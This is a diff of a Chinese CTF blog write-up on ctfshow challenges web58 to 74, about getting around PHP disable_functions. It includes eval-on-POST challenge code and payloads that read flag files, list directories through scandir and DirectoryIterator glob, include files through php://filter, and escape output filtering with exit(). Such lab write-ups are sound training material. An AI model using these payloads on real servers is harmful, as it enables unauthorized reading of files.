@@ -263,14 +263,20 @@
       
         <h1 id="ctfshow命令执行绕过disable-functions"><a href="#ctfshow命令执行绕过disable-functions" class="headerlink" title="ctfshow命令执行绕过disable_functions"></a>ctfshow命令执行绕过disable_functions</h1><p>船新版本，绕过禁用函数。</p>
 <span id="more"></span>
+
 <h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>绕过disable_function，那我们先看一下phpinfo() ，然后发现被禁了？？？<del>那还绕什么，关闭浏览器</del></p>
 <p>整理一下payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;高亮显示php文件</span><br><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br><span class="line">&#x2F;&#x2F;通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）</span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);          </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);        </span><br><span class="line">&#x2F;&#x2F;单一函数读文件内容：</span><br><span class="line">echo file_get_contents(&quot;flag.php&quot;);   </span><br><span class="line">readfile(&quot;flag.php&quot;);                      </span><br><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br><span class="line">&#x2F;&#x2F;文件包含绕过：</span><br><span class="line">post:c&#x3D;include($_GET[1]);</span><br><span class="line">get:?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
 <p>再贴出羽师傅的一些其他操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetss($a);echo $line;&#125;       &#x2F;&#x2F;php7.3版本后 该函数已不再被使用</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);                                      &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);                                   &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125;        &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetc($a);echo $line;&#125;        &#x2F;&#x2F;过60</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);print_r($line);&#125;  &#x2F;&#x2F;过60</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));highlight_file(&quot;&#x2F;flag.txt&quot;);                                                           &#x2F;&#x2F;过66-67</span><br><span class="line">c&#x3D;$a&#x3D;opendir(&quot;&#x2F;&quot;); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;highlight_file(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-67</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag</span><br><span class="line">include()</span><br><span class="line">require()</span><br><span class="line">用法：</span><br><span class="line">include(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br><span class="line">require(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br></pre></td></tr></table></figure>
+
 <h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
 </blockquote>
@@ -278,14 +284,18 @@
 <h3 id="2、解答："><a href="#2、解答：" class="headerlink" title="2、解答："></a>2、解答：</h3><p>没变，但是flag不在当前文件夹下了。需要扫目录：</p>
 <p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">c&#x3D;print_r(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
+
 <p>扫出目录后highlight_file()即可</p>
 <h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>ban了highlight_file()</p>
 <h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>试试include(‘/flag.php’) 发现太大出不来。考虑到flag应该在根目录下的flag.txt里，于是直接用包含做。</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure>
+
 <p>扩展：扫目录函数被ban完了。记录下Y4的扫目录操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
 <p>官方介绍：</p>
 <blockquote>
@@ -294,16 +304,22 @@
 <p>利用exit，停止后面的程序</p>
 <p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;require(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
+
 <h2 id="web72（不会）"><a href="#web72（不会）" class="headerlink" title="web72（不会）"></a>web72（不会）</h2><p>不会，之后学</p>
 <h2 id="web73、74"><a href="#web73、74" class="headerlink" title="web73、74"></a>web73、74</h2><p>文件不再是flag.txt了，需要自己扫，但是扫的东西ban了一大半。</p>
 <h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通过glob遍历目录：</p>
 <p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php</span><br><span class="line">	$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#39; &#39;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
 <p>扫出来一回正常文件包含梭了。</p>
 <p>能做的题都在这了，之后会总结一下命令执行的操作和姿势。</p>
 <h2 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
+</blockquote>
+<blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501</a></p>
+</blockquote>
+<blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
 </blockquote>
 
@@ -405,14 +421,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -455,13 +471,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">84k</span>
+    <span title="站点总字数">98k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:16</span>
+    <span title="站点阅读时长">1:29</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
